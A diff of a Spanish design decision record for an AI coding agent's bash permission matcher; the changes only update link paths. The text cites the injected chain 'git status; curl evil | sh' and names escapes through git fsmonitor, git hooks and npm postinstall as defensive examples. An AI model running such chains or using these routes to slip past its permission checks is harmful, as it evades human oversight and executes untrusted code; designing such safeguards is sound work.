@@ -8,14 +8,14 @@ date: "2026-07-16"
 # ADR-023 · Los permisos de `bash` se emparejan por subcomando con un tokenizador cerrado y fallan hacia `ask`
 
 **Estado:** Aceptada · 2026-07-16 (resuelve
-[G53](problemas.md#g53--la-semántica-de-emparejamiento-de-los-patrones-de-permiso-toolargumento-no-está-especificada-y-en-bash-el-encadenamiento-la-vuelve-una-frontera-falsa--agentemd-5--chatmd-5--guia-pluginsmd--resuelto),
+[G53](../../findings/g53-la-semantica-de-emparejamiento.md),
 origen SEC-02 de la
-[auditoría de seguridad 2026-07-16](audits/auditoria-seguridad-2026-07-16.md);
-no toca [api.md](api.md) ni `enu.version.api` — los permisos son vocabulario
+[auditoría de seguridad 2026-07-16](../../audits/auditoria-seguridad-2026-07-16.md);
+no toca [api.md](../../contracts/api.md) ni `enu.version.api` — los permisos son vocabulario
 de producto y viven en la extensión `agent`)
 
 **Contexto.** Los permisos del agente son patrones `tool[:argumento]`
-([agente.md](agente.md) §5), pero ningún documento fijaba el algoritmo de
+([agente.md](../../contracts/agente.md) §5), pero ningún documento fijaba el algoritmo de
 emparejamiento. Con el glob implícito sobre el string crudo del comando,
 `allow = { "bash:git *" }` equivalía a `bash:*`: basta encadenar
 (`git status; curl evil | sh`) para que el prefijo casado arrastre un comando
@@ -27,7 +27,7 @@ un proyecto de seguridad en sí mismo, y una primitiva de kernel nueva con un
 único consumidor.
 
 **Decisión.** El **modelo del matcher de Claude Code, adaptado**,
-especificado como contrato en [agente.md](agente.md) §5:
+especificado como contrato en [agente.md](../../contracts/agente.md) §5:
 
 1. **Match general**: patrón sin `:` = nombre exacto de la tool; `tool:arg` =
    glob anclado (`*` ⇒ `.*`, `^…$`, resto de caracteres literales) sobre la
@@ -48,10 +48,10 @@ especificado como contrato en [agente.md](agente.md) §5:
    en el pipeline y queda documentado como **best-effort** (doctrina G16:
    `/bin/rm`, aliases y variantes no se prometen).
 5. **"Permitir siempre" sobre un comando compuesto persiste una regla por
-   subcomando** ([chat.md](chat.md) §5, P29), no el string encadenado.
+   subcomando** ([chat.md](../../contracts/chat.md) §5, P29), no el string encadenado.
 
 El salto al programa parseado queda pospuesto con disparador doble
-([P39](pospuesto.md)).
+([P39](../../postponed/pospuesto.md)).
 
 **Consecuencias.**
 
@@ -62,8 +62,8 @@ El salto al programa parseado queda pospuesto con disparador doble
   no modelables caen a `ask` (y en headless, a deny). Esa fricción, si se
   documenta y duele, es exactamente el disparador de P39 — el diseño convierte
   su propio coste en la señal de reapertura.
-- La **advertencia honesta** queda en los contratos ([agente.md](agente.md)
-  §5, [guia-plugins.md](guia-plugins.md)): ni `allow` ni `deny` acotan lo que
+- La **advertencia honesta** queda en los contratos ([agente.md](../../contracts/agente.md)
+  §5, [guia-plugins.md](../../contracts/guia-plugins.md)): ni `allow` ni `deny` acotan lo que
   un binario permitido ejecuta por dentro (`git -c core.fsmonitor=…`, hooks
   de git, `postinstall` de npm). El emparejamiento decide qué comandos
   arrancan; la valla dura para código no confiable siguen siendo los workers
@@ -74,7 +74,7 @@ El salto al programa parseado queda pospuesto con disparador doble
   tokenizador que "entendiera más" sin registro reabriría la grieta en
   silencio.
 - "Nombre exacto, sin glob" deja sin efecto el patrón
-  `allow = {"mcp__<servidor>__*"}` que [arquitectura.md](arquitectura.md)
+  `allow = {"mcp__<servidor>__*"}` que [arquitectura.md](../../core/arquitectura.md)
   ejemplificaba para autorizar un servidor MCP entero (actualizado):
   autorizarlo es enumerar sus tools o conceder por hook `permission`. Es
   deliberado — un glob sobre nombres reintroduciría por la puerta de atrás
